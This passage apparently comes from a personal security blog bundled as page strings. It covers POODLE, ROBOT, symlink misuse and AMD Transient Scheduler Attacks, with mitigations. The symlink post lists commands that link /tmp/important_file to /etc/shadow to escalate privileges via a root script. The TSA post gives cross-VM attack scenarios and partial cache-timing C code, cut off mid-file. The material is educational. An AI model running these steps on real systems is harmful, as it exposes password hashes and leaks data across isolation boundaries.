          attention for exploiting weaknesses in SSL and TLS, respectively. This blog provides an in-depth look at
          these attacks, how they work, and their implications for modern cybersecurity.
        </p>

        <h2>POODLE Attack (Padding Oracle On Downgraded Legacy Encryption)</h2>
        <h3>Introduction</h3>
        <p>
          The POODLE attack, discovered by Google researchers in October 2014, targets the SSL 3.0 (Secure Sockets
          Layer) protocol. Despite SSL 3.0 being considered obsolete and replaced by more secure protocols like TLS
          (Transport Layer Security), many servers and clients still support SSL 3.0 for backward compatibility
          reasons. This presents a security risk as POODLE takes advantage of vulnerabilities in how SSL 3.0
          implements padding for block cipher encryption, enabling attackers to decrypt sensitive information such
          as cookies, passwords, and session tokens.
        </p>

        <h3>How SSL 3.0 Works</h3>
        <p>
          SSL 3.0 uses block ciphers in CBC (Cipher Block Chaining) mode. This mode encrypts data by dividing it
          into fixed-size blocks, typically 64 or 128 bits. When the data is not a multiple of the block size,
          padding is added to fill the last block. This padding is where SSL 3.0’s vulnerability lies.
        </p>
        <p>
          When a message is decrypted, the padding is checked for correctness. However, SSL 3.0 does not explicitly
          verify the padding bytes, allowing attackers to use a padding oracle attack. If an attacker can observe
          how a server responds to different padding values, they can slowly infer the content of the encrypted
          message.
        </p>

        <h3>POODLE Attack Workflow</h3>
        <ol>
          <li>
            <b>Downgrade Attack:</b> Many browsers and servers that support TLS also support SSL 3.0 for backward
            compatibility. An attacker can exploit this by forcing the connection to downgrade from the more secure
            TLS protocol to SSL 3.0. This is done by intercepting and tampering with the initial handshake between
            the client and the server.
          </li>
          <li>
            <b>Padding Oracle Exploitation:</b> Once SSL 3.0 is being used, the attacker can send maliciously
            crafted requests containing intentionally incorrect padding. Based on the server’s response (e.g., an
            error message or no response), the attacker can infer whether the padding was correct. This
            side-channel information can then be used to decrypt the message byte-by-byte.
          </li>
          <li>
            <b>Decrypting Sensitive Data:</b> With enough time and crafted requests, an attacker can decrypt data
            like authentication cookies, which are used to identify the user in a session. This allows the attacker
            to hijack the user’s session and potentially gain unauthorized access to sensitive information.
          </li>
        </ol>

        <h3>Vulnerable Systems</h3>
        <ul>
          <li>Systems that still support SSL 3.0 for backward compatibility.</li>
          <li>Systems that use CBC-mode cipher suites with SSL 3.0.</li>
        </ul>

        <h3>Impact</h3>
        <p>
          The POODLE attack poses a significant risk because it allows attackers to decrypt HTTPS-protected data,
          exposing sensitive user information. Once decrypted, this information can be used to impersonate users,
          steal credentials, and compromise web sessions.
        </p>

        <h3>Mitigation Strategies</h3>
        <ul>
          <li><b>Disable SSL 3.0:</b> Prevent POODLE attacks by disabling SSL 3.0 on both the client and server.</li>
          <li>
            <b>Enforce TLS-Only Communication:</b> Ensure that all clients and servers use TLS 1.2 or higher
            exclusively. By refusing to accept SSL 3.0 connections, you mitigate the possibility of an attacker
            forcing a downgrade.
          </li>
          <li>
            <b>Enable Secure Cipher Suites:</b> Use secure cipher suites that are not vulnerable to padding oracle
            attacks. Configure your web server to prioritize AEAD (Authenticated Encryption with Associated Data)
            cipher suites.
          </li>
        </ul>

        <h2>GOLDENDOODLE Attack</h2>
        <h3>Introduction</h3>
        <p>
          The GOLDENDOODLE attack, discovered in 2019, is an extension of padding oracle attacks. It specifically
          targets TLS 1.0, 1.1, and 1.2 implementations that use CBC-mode encryption. Like POODLE, it exploits
          vulnerabilities in block cipher padding.
        </p>

        <h3>Mitigation Strategies</h3>
        <ul>
          <li><b>Upgrade to TLS 1.3:</b> The most effective mitigation is upgrading to TLS 1.3.</li>
          <li>
            <b>Disable CBC-Mode Cipher Suites:</b> Use secure alternatives like GCM (Galois/Counter Mode), which is
            less prone to padding attacks.
          </li>
          <li>
            <b>Apply Security Patches:</b> Ensure systems are updated with the latest security patches for TLS
            implementations.
          </li>
        </ul>
      </div>
    </section>
  </main>

  <!-- FOOTER -->
  <footer class="footer">
    <div class="container">
      <p>&copy; 2024 Hem Parekh | All rights reserved.</p>
    </div>
  </footer>

  <!-- Link to JS for theme toggle -->
  <script src="script.js"><\/script>
</body>
</html>`,hb=`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>The ROBOT Attack: Return of Bleichenbacher’s Oracle Threat</title>

  <!-- Link to the common style.css -->
  <link rel="stylesheet" href="style.css" />
</head>
<body class="dark">

  <!-- NAVBAR -->
  <nav class="navbar">
    <div class="container nav-container">
      <div class="logo">Hem Parekh's Blog</div>
      <ul class="nav-links">
        <li><a href="index.html#home">Home</a></li>
        <li><a href="index.html#about">About</a></li>
        <li><a href="index.html#experience">Experience</a></li>
        <li><a href="index.html#projects">Projects</a></li>
        <li><a href="blogs.html" class="active">Blog</a></li>
      </ul>
      <button class="theme-toggle" id="themeToggle">Light Mode</button>
    </div>
  </nav>

  <!-- BLOG POST HEADER -->
  <header class="blog-post-header">
    <div class="container">
      <h1 class="blog-post-title">The ROBOT Attack: Return of Bleichenbacher’s Oracle Threat</h1>
      <p class="blog-post-date">Published on: December 24, 2024</p>
    </div>
  </header>

  <!-- BLOG POST CONTENT -->
  <main>
    <section class="blog-post-content">
      <div class="container">
        <p>
          In 2017, security researchers uncovered a vulnerability that re-exposed a nearly two-decade-old attack against RSA encryption in TLS (Transport Layer Security): the <b>ROBOT attack</b> (Return of Bleichenbacher’s Oracle Threat). Originally discovered by Daniel Bleichenbacher in 1998, the Bleichenbacher Oracle Attack allowed attackers to decrypt sensitive data, such as session keys, by exploiting certain flawed implementations of RSA.
        </p>
        <p>
          Despite advancements in cryptography, misconfigurations in modern RSA implementations have resurfaced this threat, putting specific systems at risk even today. This blog will break down the ROBOT attack, provide examples, and discuss mitigations to protect vulnerable systems.
        </p>

        <h2>How the ROBOT Attack Works</h2>
        <p>
          At the heart of the ROBOT attack is an interaction between a vulnerable server and an attacker where the server unintentionally leaks information about encrypted messages. This process allows attackers to decrypt RSA ciphertexts or perform signing operations with the server’s private key.
        </p>
        <p>
          The attacker sends deliberately malformed RSA ciphertexts to the server, and based on the server’s response (the “oracle”), they can infer details about the decrypted plaintext. By repeating this process enough times, they can eventually decrypt sensitive information.
        </p>

        <h3>Step-by-Step Breakdown of ROBOT:</h3>
        <ol>
          <li><b>Malformed Ciphertexts:</b> The attacker sends specially crafted RSA ciphertexts to the vulnerable server.</li>
          <li><b>Oracle Response:</b> The server attempts to decrypt the ciphertext and responds with information revealing whether the decryption was successful.</li>
          <li><b>Iteration Process:</b> The attacker uses the server’s responses to refine their guesses, repeating this process multiple times.</li>
          <li><b>Decryption of Sensitive Data:</b> After enough iterations, the attacker can decrypt sensitive data such as TLS session keys.</li>
        </ol>

        <h2>Real-World Example of ROBOT</h2>
        <p>
          To better understand how this attack can be used in real-world scenarios, consider a web server that uses RSA encryption to secure TLS connections. If the server’s RSA implementation is vulnerable, an attacker can exploit it to decrypt sensitive information.
        </p>
        <p>
          For example, if a banking website is vulnerable to ROBOT, an attacker could gain access to the TLS session keys, which would allow them to decrypt sensitive information such as login credentials, transaction details, and personal user data. This could lead to serious breaches in confidentiality and data security.
        </p>

        <h2>Affected Systems</h2>
        <p>Various widely-used products have been found vulnerable to ROBOT, including:</p>
        <ul>
          <li>OpenSSL (before version 1.0.2h)</li>
          <li>F5 Networks BIG-IP load balancers</li>
          <li>Cisco devices</li>
          <li>Certain Oracle and Citrix products</li>
        </ul>
        <p>
          Though many systems have since been patched, ROBOT still poses a risk to any system that hasn’t been updated to mitigate this vulnerability.
        </p>

        <h2>Mitigation and Prevention</h2>
        <p>
          Preventing ROBOT attacks requires system administrators and developers to ensure that their RSA implementations are correctly configured. Here are some steps to mitigate the risk of ROBOT:
        </p>
        <ul>
          <li><b>Disable RSA Encryption:</b> The most effective protection is to disable RSA key exchange in favor of Elliptic Curve Diffie-Hellman (ECDHE), which provides forward secrecy and is not vulnerable to ROBOT.</li>
          <li><b>Apply Security Patches:</b> Ensure that you’re using the latest versions of your software libraries and applying all relevant security patches. For instance, upgrading to OpenSSL 1.0.2h or later will mitigate the ROBOT attack.</li>
          <li><b>Implement Stronger Cryptographic Methods:</b> Use stronger encryption protocols such as Elliptic Curve Cryptography (ECC) to secure communications. ECC-based methods, like ECDHE, are considered more secure and resistant to attacks like ROBOT.</li>
          <li><b>Regular Vulnerability Testing:</b> Conduct routine vulnerability assessments and audits to identify and address potential misconfigurations or weaknesses in cryptographic implementations.</li>
        </ul>

        <h3>Example of Mitigation in OpenSSL:</h3>
<div class="code-block">
  <code>
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_prefer_server_ciphers on;
    ssl_ciphers 'ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384';
  </code>
</div>
<p>
  This configuration forces the server to use Elliptic Curve Diffie-Hellman key exchange methods, providing forward secrecy and reducing the risk of a ROBOT attack.
</p>

        <h2>Conclusion</h2>
        <p>
          The ROBOT attack underscores how vulnerabilities from decades ago can resurface in modern systems due to misconfigurations or unpatched software. Although the original Bleichenbacher attack was discovered in 1998, its return in 2017 highlights the importance of staying vigilant in cryptographic practices and regularly updating systems.
        </p>
        <p>
          By disabling RSA key exchanges, patching vulnerable systems, and implementing stronger encryption protocols, administrators can effectively mitigate the risk of ROBOT attacks and protect sensitive data.
        </p>
      </div>
    </section>
  </main>

  <!-- FOOTER -->
  <footer class="footer">
    <div class="container">
      <p>&copy; 2024 Hem Parekh | All rights reserved.</p>
    </div>
  </footer>

  <!-- Link to JS for theme toggle -->
  <script src="script.js"><\/script>
</body>
</html>`,fb=`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Exploring Symlinks: Practical Usage and Security Implications</title>

  <!-- Link to the common style for light/dark mode -->
  <link rel="stylesheet" href="style.css" />
</head>
<body class="dark">

  <!-- NAVBAR -->
  <nav class="navbar">
    <div class="container nav-container">
      <div class="logo">Hem Parekh's Blog</div>
      <ul class="nav-links">
        <li><a href="index.html#home">Home</a></li>
        <li><a href="index.html#about">About</a></li>
        <li><a href="index.html#experience">Experience</a></li>
        <li><a href="index.html#projects">Projects</a></li>
        <li><a href="blogs.html" class="active">Blog</a></li>
      </ul>
      <!-- Theme Toggle Button -->
      <button class="theme-toggle" id="themeToggle">Light Mode</button>
    </div>
  </nav>

  <!-- BLOG POST HEADER -->
  <header class="blog-post-header">
    <div class="container">
      <h1 class="blog-post-title">Exploring Symlinks: Practical Usage and Security Implications</h1>
      <p class="blog-post-date">Published on: December 24, 2024</p>
    </div>
  </header>

  <!-- BLOG POST CONTENT -->
  <section class="blog-post-content">
    <div class="container">
      <div class="blog-text">
        <h2>What Are Symlinks?</h2>
        <p>
          In Linux, symbolic links are essentially shortcuts that point to other files or directories. They allow you to reference a file or directory without duplicating its contents. Symlinks are incredibly useful when you need to access or organize files in multiple locations. However, if used carelessly, they can create security vulnerabilities, particularly when root-owned processes interact with user-created symlinks.
        </p>

        <h3>Hard Links vs. Symbolic Links</h3>
        <ul>
          <li><strong>Hard Links:</strong> Direct references to data on disk. Hard links share the same inode with the original file, meaning they’re identical and can’t link to directories.</li>
          <li><strong>Symbolic Links (Symlinks):</strong> References that point to the path of a target file or directory. Symlinks are separate from the original file’s data, so deleting the target will break the link.</li>
        </ul>

        <h2>Creating and Using Symlinks</h2>
        <p>The basic syntax for creating a symlink is:</p>
        <div class="code-block">
          <code>ln -s [target] [symlink_name]</code>
        </div>
        <p>
          • <strong>[target]:</strong> The file or directory you want to link to.<br>
          • <strong>[symlink_name]:</strong> The name of your symlink.
        </p>

        <h3>Examples</h3>
        <div class="code-block">
          <code>
# Creating a symlink to a file<br>
ln -s /home/user/documents/file.txt /home/user/desktop/file_link.txt
          </code>
        </div>
        <p>This creates <code>file_link.txt</code> on your desktop, which behaves like a shortcut to <code>file.txt</code>.</p>

        <div class="code-block">
          <code>
# Creating a symlink to a directory<br>
ln -s /home/user/projects /home/user/desktop/projects_link
          </code>
        </div>
        <p>Accessing <code>projects_link</code> will take you directly to <code>/home/user/projects</code>.</p>

        <h3>Overwriting an Existing Symlink</h3>
        <div class="code-block">
          <code>ln -sf /new/target/path /path/to/existing_symlink</code>
        </div>
        <p>The <code>-f</code> option forces the update of the symlink’s target.</p>

        <h2>Privilege Escalation Using Symlinks</h2>
        <p>
          During my Hack The Box challenge, I learned how symlinks can be used to escalate privileges when system configurations are insecure. Here’s how this works:
        </p>

        <h3>Scenario: Exploiting a Root-Owned Script</h3>
        <p>
          Imagine a script (<code>backup.sh</code>) owned by root regularly copies files from a directory to a root-owned backup location. If the script is designed to follow any symlinks it encounters, this could give normal users access to root-level files.
        </p>

        <h3>Steps to Exploit</h3>
        <div class="code-block">
          <code>
# Step 1: Remove any existing file at /tmp/important_file<br>
rm -f /tmp/important_file<br><br>
# Step 2: Create a symlink pointing to /etc/shadow<br>
ln -s /etc/shadow /tmp/important_file<br><br>
# Step 3: Wait for the root script to run or run it manually if possible<br>
          </code>
        </div>
        <p>
          If the root script copies <code>/etc/shadow</code> to a location accessible to the user, the user can potentially gain root-level information and escalate privileges.
        </p>

        <h2>Mitigating This Exploit</h2>
        <ul>
          <li><strong>Avoid Following Symlinks in Scripts:</strong> Avoid copying or modifying files without checking for symlinks, especially in root-owned scripts.</li>
          <li><strong>Use the <code>-P</code> Option in <code>cp</code>:</strong> This flag tells <code>cp</code> not to follow symlinks, helping to prevent exploitation.</li>
          <li><strong>Restrict Writable Directories:</strong> Limit permissions on directories where files are written or manipulated by privileged processes.</li>
        </ul>

        <h2>Conclusion</h2>
        <p>
          Symlinks are an incredibly powerful tool for managing files and directories, but they come with inherent risks if not handled carefully. Understanding how symlinks work and the potential security implications is critical for both system administrators and security professionals. Whether you're organizing files or working on penetration testing challenges, symlinks offer both utility and insight into system-level operations.
        </p>
      </div>
    </div>
  </section>

  <!-- FOOTER -->
  <footer class="footer">
    <div class="container">
      <p>&copy; 2024 Hem Parekh | All rights reserved.</p>
    </div>
  </footer>

  <!-- Link to JS for theme toggle -->
  <script src="script.js"><\/script>
</body>
</html>`,mb=`<div class="markdown-heading"><h1 class="heading-element">Transient Scheduler Attacks on CPUs: Exploiting AMD’s New Microarchitectural Leak</h1><a id="user-content-transient-scheduler-attacks-on-cpus-exploiting-amds-new-microarchitectural-leak" class="anchor" aria-label="Permalink: Transient Scheduler Attacks on CPUs: Exploiting AMD’s New Microarchitectural Leak" href="#transient-scheduler-attacks-on-cpus-exploiting-amds-new-microarchitectural-leak"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>In 2018, <em>Spectre</em> and <em>Meltdown</em> taught everyone that “just running code” on a CPU was enough to leak data you were <em>never</em> supposed to see. We patched, mitigated, and told ourselves the worst was over.</p>
<p>Fast-forward to 2025 and AMD quietly drops a new phrase into the hardware-security lexicon:</p>
<blockquote>
<p><strong>Transient Scheduler Attacks (TSA)</strong> – a fresh class of speculative side-channel leaks in AMD CPUs, abusing the <em>instruction scheduler</em> itself.</p>
</blockquote>
<p>If Spectre was about mispredicted branches and Meltdown about rogue loads, TSA is about <strong>“false completions”</strong>: the CPU momentarily believes a load has finished and forwards <em>invalid</em> data into dependent instructions. That data isn’t architecturally visible—but it <em>does</em> change how long later instructions take to execute, and those timing differences leak information across privilege boundaries.</p>
<p>In this post, we’ll unpack TSA from a red-team mindset:</p>
<ul>
<li>What TSA actually is (minus marketing),</li>
<li>How an attacker could <em>conceptually</em> exploit it,</li>
<li>A tiny lab you can build to “feel” this class of leak,</li>
<li>And what defenders should do before their schedulers start talking.</li>
</ul>
<hr>
<div class="markdown-heading"><h2 class="heading-element">1. Quick refresher: speculative execution &amp; side-channels</h2><a id="user-content-1-quick-refresher-speculative-execution--side-channels" class="anchor" aria-label="Permalink: 1. Quick refresher: speculative execution &amp; side-channels" href="#1-quick-refresher-speculative-execution--side-channels"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>Modern CPUs are performance junkies. They:</p>
<ul>
<li>
<strong>Speculatively execute</strong> instructions before they’re 100% sure they’re needed (branch prediction, memory prediction, etc.).</li>
<li>
<strong>Out-of-order schedule</strong> instructions to keep execution units busy.</li>
<li>
<strong>Forward data</strong> between loads and stores without waiting for the full memory pipeline.</li>
</ul>
<p>Most of the time, that works great. Occasionally, it creates <strong>transient states</strong> where:</p>
<ol>
<li>The CPU does some work based on <em>guessed</em> information,</li>
<li>Later realizes it guessed wrong,</li>
<li>Rolls back the architectural state…</li>
<li>But the <strong>microarchitectural state</strong> (caches, predictors, queues, timing) still remembers what happened.</li>
</ol>
<p>Classic attacks:</p>
<ul>
<li>
<strong>Spectre</strong>: abuse branch prediction → transiently execute code that touches secret-dependent memory → leak via cache timing.</li>
<li>
<strong>Meltdown / Foreshadow / MDS</strong>: abuse permission checks and internal buffers to read data across isolation boundaries.</li>
</ul>
<p>TSA is the same story <em>one layer deeper</em>: not the branch predictor, not the cache hierarchy, but the <strong>scheduler and its perception of whether a load is “done.”</strong></p>
<hr>
<div class="markdown-heading"><h2 class="heading-element">2. What AMD calls “Transient Scheduler Attacks”</h2><a id="user-content-2-what-amd-calls-transient-scheduler-attacks" class="anchor" aria-label="Permalink: 2. What AMD calls “Transient Scheduler Attacks”" href="#2-what-amd-calls-transient-scheduler-attacks"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>AMD’s 2025 security bulletin and technical whitepaper describe TSA as a new speculative side channel that appears when certain <strong>load instructions experience “false completion.”</strong></p>
<div class="markdown-heading"><h3 class="heading-element">2.1 False completions in a nutshell</h3><a id="user-content-21-false-completions-in-a-nutshell" class="anchor" aria-label="Permalink: 2.1 False completions in a nutshell" href="#21-false-completions-in-a-nutshell"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>Under specific timing and microarchitectural conditions:</p>
<ol>
<li>A load instruction is expected to hit in a fast structure (e.g., L1 cache).</li>
<li>Hardware <em>optimistically</em> assumes the data will be ready quickly.</li>
<li>Dependent operations get scheduled based on that assumption.</li>
<li>But something goes wrong – the load <em>didn’t</em> actually complete (it missed in L1, or the store data isn’t ready, etc.).</li>
<li>The CPU forwards <strong>invalid data</strong> to dependent instructions temporarily.</li>
<li>The load is later re-executed with the correct data, and dependents re-run.</li>
</ol>
<p>Crucially:</p>
<ul>
<li>You don’t get a pipeline flush like some other transient behaviors.</li>
<li>That invalid data <strong>doesn’t update caches or TLBs</strong>, so you can’t see it with classic cache-based side-channels.</li>
<li>But the invalid data <em>does</em> influence the <strong>timing</strong> of other instructions in the core, and that timing is observable.</li>
</ul>
<p>Hence: <strong>Transient Scheduler Attacks</strong> – you leak data by watching how the scheduler behaves when it has been lied to.</p>
<div class="markdown-heading"><h3 class="heading-element">2.2 Two main variants: TSA-L1 and TSA-SQ</h3><a id="user-content-22-two-main-variants-tsa-l1-and-tsa-sq" class="anchor" aria-label="Permalink: 2.2 Two main variants: TSA-L1 and TSA-SQ" href="#22-two-main-variants-tsa-l1-and-tsa-sq"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>AMD’s technical guidance splits TSA into two sub-variants:</p>
<ul>
<li>
<p><strong>TSA-L1 (L1 data cache variant)</strong></p>
<ul>
<li>Modern AMD cores use a <strong>microtag</strong> structure to accelerate L1 lookups.</li>
<li>In some edge cases, the microtag says “hit” when the real L1 line isn’t there.</li>
<li>The load experiences a false completion and receives invalid data from whatever was associated with that microtag entry.</li>
<li>An attacker who can repeatedly engineer this state can infer <strong>what’s in the L1 cache</strong>, even if it belongs to:
<ul>
<li>OS kernel vs user process,</li>
<li>Hypervisor vs guest VM,</li>
<li>One VM vs another.</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>TSA-SQ (store queue variant)</strong></p>
<ul>
<li>The store queue tracks in-flight stores and sometimes forwards their data to matching loads (<strong>Store-To-Load Forwarding</strong>).</li>
<li>In some timing windows, a load that matches an older store may see a false completion where invalid data comes from a <em>previous</em> occupant of that store-queue entry.</li>
<li>An attacker may infer data from older stores—potentially across kernel/user boundaries—but cross-VM leakage here appears more limited.</li>
</ul>
</li>
</ul>
<p>So TSA-L1 is your <strong>“peek into L1 from another context”</strong> scenario, whereas TSA-SQ is more like <strong>“see what older stores were doing”</strong> if you can hit the timing window.</p>
<div class="markdown-heading"><h3 class="heading-element">2.3 Affected CPUs &amp; severity</h3><a id="user-content-23-affected-cpus--severity" class="anchor" aria-label="Permalink: 2.3 Affected CPUs &amp; severity" href="#23-affected-cpus--severity"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<ul>
<li>TSA affects <strong>AMD Family 19h</strong> processors (Zen 3 / Zen 4 class parts, including EPYC and Ryzen families).</li>
<li>Individual CVEs are rated in the “medium” band, but collectively TSA is treated as a <strong>speculative side-channel class</strong> that can leak data across privilege boundaries.</li>
<li>AMD is shipping <strong>microcode updates</strong> plus OS/hypervisor guidance; the Linux kernel added a dedicated <code>MITIGATION_TSA</code> config option and a <code>tsa=</code> boot parameter to toggle mitigation strategies.</li>
</ul>
<p>In other words: TSA isn’t “you can RCE the CPU via JavaScript,” but it <em>is</em> “if an attacker can run code on the same CPU, they may spy on higher-privileged contexts.”</p>
<hr>
<div class="markdown-heading"><h2 class="heading-element">3. How would an attacker actually abuse TSA?</h2><a id="user-content-3-how-would-an-attacker-actually-abuse-tsa" class="anchor" aria-label="Permalink: 3. How would an attacker actually abuse TSA?" href="#3-how-would-an-attacker-actually-abuse-tsa"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>From a red-team point of view, TSA is about <strong>turning local code execution into a powerful side-channel primitive</strong>.</p>
<p>AMD is quite explicit about preconditions:</p>
<blockquote>
<p>TSA is likely only exploitable if the attacker can run arbitrary code on the machine and can repeatedly trigger victim activity to build up a measurable signal.</p>
</blockquote>
<p>So think <strong>“post-compromise escalation / stealth data theft”</strong>, not “remote drive-by.”</p>
<div class="markdown-heading"><h3 class="heading-element">3.1 Threat models that actually make sense</h3><a id="user-content-31-threat-models-that-actually-make-sense" class="anchor" aria-label="Permalink: 3.1 Threat models that actually make sense" href="#31-threat-models-that-actually-make-sense"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>Some realistic scenarios:</p>
<ol>
<li>
<p><strong>Malicious VM in a public cloud</strong></p>
<ul>
<li>You rent a VM on a shared EPYC host.</li>
<li>You arrange your workload so that:
<ul>
<li>Your VM executes carefully crafted load/store sequences, trying to create false completions,</li>
<li>You constantly measure timing of your own code,</li>
<li>You synchronize with a high-value victim VM (e.g., by hitting its web API, causing it to perform sensitive operations repeatedly).</li>
</ul>
</li>
<li>Over many iterations, you try to reconstruct bits of secrets used in the victim: crypto keys, keystroke patterns, or data-dependent control paths.</li>
</ul>
</li>
<li>
<p><strong>Untrusted plugin / extension in a multi-tenant app</strong></p>
<ul>
<li>Think: a plugin system where tenants can upload native or WASM modules and get CPU time on the same host as privileged code.</li>
<li>The plugin runs malicious code that tries to observe kernel or hypervisor behavior via TSA-style timing leaks, especially across system calls or hypercalls.</li>
</ul>
</li>
<li>
<p><strong>Malware on a bare-metal server</strong></p>
<ul>
<li>Traditional malware already has local execution.</li>
<li>TSA gives it a way to break isolation between:
<ul>
<li>Normal user processes and privileged daemons,</li>
<li>Or between containers that happen to share cores.</li>
</ul>
</li>
</ul>
</li>
</ol>
<p>In <em>all</em> these cases, TSA doesn’t give you code execution; it gives you a <strong>new, stealthy information-leak channel</strong> once you’re on the box.</p>
<div class="markdown-heading"><h3 class="heading-element">3.2 What does “exploitation” look like?</h3><a id="user-content-32-what-does-exploitation-look-like" class="anchor" aria-label="Permalink: 3.2 What does “exploitation” look like?" href="#32-what-does-exploitation-look-like"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>High-level exploitation strategy (similar in spirit to other speculative side channels):</p>
<ol>
<li>
<p><strong>Prime microarchitectural state</strong></p>
<ul>
<li>Arrange L1 cache or store queue to contain patterns that encode guesses about victim data (or vice versa).</li>
</ul>
</li>
<li>
<p><strong>Trigger victim computation</strong></p>
<ul>
<li>System call, network request, hypercall—anything that causes the victim to touch sensitive data.</li>
<li>Repeat this many times so you can average out noise.</li>
</ul>
</li>
<li>
<p><strong>Force false completions</strong></p>
<ul>
<li>Using carefully chosen addresses and instruction sequences, steer certain victim or attacker loads into the microtag / store-queue corner cases described in TSA-L1 and TSA-SQ.</li>
</ul>
</li>
<li>
<p><strong>Measure timing in attacker context</strong></p>
<ul>
<li>The invalid forwarded data doesn’t leak directly, but it changes how long later instructions take to execute.</li>
<li>By correlating timing patterns with what you know you primed, you infer bits of secret state in the victim’s cache lines or stores.</li>
</ul>
</li>
<li>
<p><strong>Do this… a lot</strong></p>
<ul>
<li>TSA is noisy. You typically need many victim invocations to create a measurable signal.</li>
</ul>
</li>
</ol>
<p>If that sounds abstract, that’s because it is—<strong>real TSA exploitation is non-trivial</strong>. But you can build a lab to internalize the shape of the attack.</p>
<hr>
<div class="markdown-heading"><h2 class="heading-element">4. A tiny lab to “feel” scheduler-style leaks (with code)</h2><a id="user-content-4-a-tiny-lab-to-feel-scheduler-style-leaks-with-code" class="anchor" aria-label="Permalink: 4. A tiny lab to “feel” scheduler-style leaks (with code)" href="#4-a-tiny-lab-to-feel-scheduler-style-leaks-with-code"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>We’re still <strong>not</strong> reproducing TSA itself (that’s complex research), but we can build a lab that:</p>
<ul>
<li>Shows how <strong>secret-dependent memory access → timing difference → information leak</strong> works, and</li>
<li>Uses patterns similar to what real speculative / transient attacks exploit.</li>
</ul>
<p>Think of this as a <strong>Flush+Reload / cache timing 101</strong> exercise that warms people up conceptually for TSA.</p>
<blockquote>
<p><g-emoji class="g-emoji" alias="warning">⚠️</g-emoji> Educational only. Run this only on machines you own. Don’t point this at shared environments you don’t control.</p>
</blockquote>
<div class="markdown-heading"><h3 class="heading-element">4.1 Full toy example: secret-dependent access + timing</h3><a id="user-content-41-full-toy-example-secret-dependent-access--timing" class="anchor" aria-label="Permalink: 4.1 Full toy example: secret-dependent access + timing" href="#41-full-toy-example-secret-dependent-access--timing"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>This is a self-contained C toy that:</p>
<ul>
<li>Has a “secret” byte,</li>
<li>A victim function that touches memory depending on that secret,</li>
<li>An attacker that measures which memory line is “hot” by timing loads with <code>rdtsc</code>.</li>
</ul>
<div class="highlight highlight-source-c"><pre><span class="pl-c">// gcc -O2 -march=native -o tsa_toy tsa_toy.c</span>
<span class="pl-c">// Simple educational cache timing demo:</span>
<span class="pl-c">//  - victim_operation() uses a secret-dependent index</span>
<span class="pl-c">//  - attacker measures which index is fastest to infer the secret</span>

<span class="pl-k">#define</span> <span class="pl-s1">_GNU_SOURCE</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;stdio.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;stdint.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;x86intrin.h&gt;</span>   <span class="pl-c">// for __rdtscp, _mm_clflush</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;unistd.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;limits.h&gt;</span>

<span class="pl-k">#define</span> <span class="pl-c1">STRIDE</span> 4096      // ensure different cache lines
<span class="pl-k">#define</span> <span class="pl-c1">PROBE_SIZE</span> 256

<span class="pl-c">// Shared array used as our "probe" for timing</span>
<span class="pl-smi">uint8_t</span> <span class="pl-s1">probe_array</span>[<span class="pl-c1">PROBE_SIZE</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>];

<span class="pl-c">// Fake secret we want to "leak"</span>
<span class="pl-k">volatile</span> <span class="pl-smi">uint8_t</span> <span class="pl-s1">secret</span> <span class="pl-c1">=</span> <span class="pl-c1">0x42</span>;  <span class="pl-c">// 66 decimal</span>

<span class="pl-c">// Victim: uses attacker-controlled hint, mixed with secret, to pick an index</span>
<span class="pl-smi">void</span> <span class="pl-en">victim_operation</span>(<span class="pl-smi">uint8_t</span> <span class="pl-s1">attacker_hint</span>) {
    <span class="pl-smi">uint8_t</span> <span class="pl-s1">idx</span> <span class="pl-c1">=</span> <span class="pl-s1">attacker_hint</span> ^ <span class="pl-s1">secret</span>;  <span class="pl-c">// secret-dependent index</span>
    <span class="pl-k">volatile</span> <span class="pl-smi">uint8_t</span> <span class="pl-c1">*</span><span class="pl-s1">addr</span> <span class="pl-c1">=</span> <span class="pl-c1">&amp;</span><span class="pl-s1">probe_array</span>[<span class="pl-s1">idx</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>];

    <span class="pl-c">// Load from secret-dependent location</span>
    <span class="pl-smi">uint8_t</span> <span class="pl-s1">value</span> <span class="pl-c1">=</span> <span class="pl-c1">*</span><span class="pl-s1">addr</span>;

    <span class="pl-c">// Prevent the compiler from optimizing away the load</span>
    __asm__ <span class="pl-k">volatile</span>(<span class="pl-s">""</span> :: <span class="pl-s">"r"</span>(<span class="pl-s1">value</span>) : <span class="pl-s">"memory"</span>);
}

<span class="pl-c">// Flush entire probe_array from caches</span>
<span class="pl-smi">void</span> <span class="pl-en">flush_probe_array</span>(<span class="pl-smi">void</span>) {
    <span class="pl-k">for</span> (<span class="pl-smi">int</span> <span class="pl-s1">i</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>; <span class="pl-s1">i</span> <span class="pl-c1">&lt;</span> <span class="pl-c1">PROBE_SIZE</span>; <span class="pl-s1">i</span><span class="pl-c1">++</span>) {
        <span class="pl-en">_mm_clflush</span>(<span class="pl-c1">&amp;</span><span class="pl-s1">probe_array</span>[<span class="pl-s1">i</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>]);
    }
}

<span class="pl-c">// Measure time to access probe_array[idx * STRIDE]</span>
